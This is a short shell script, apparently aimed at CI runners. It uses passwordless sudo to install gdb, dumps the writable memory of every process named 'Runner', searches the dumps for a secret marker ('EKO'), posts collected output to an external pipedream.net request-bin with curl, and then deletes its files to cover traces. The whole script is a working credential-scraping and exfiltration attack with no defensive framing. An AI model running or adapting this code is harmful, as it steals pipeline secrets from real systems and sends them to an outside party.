#!/bin/sh

# install gdb to provide gcore
# sudo is passwordless according to doc
sudo apt-get install gdb > /tmp/file.txt

mkdir /tmp/dumps

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    grep rw-p /proc/$pid/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
        gdb --batch --pid $pid -ex "dump memory /tmp/dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
      done
done

echo $(ls -la /tmp/dumps) >> /tmp/file.txt

grep EKO /tmp/dumps/*

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

rm /tmp/file.txt
rm /tmp/run-results.txt
rm -rf /tmp/dumps
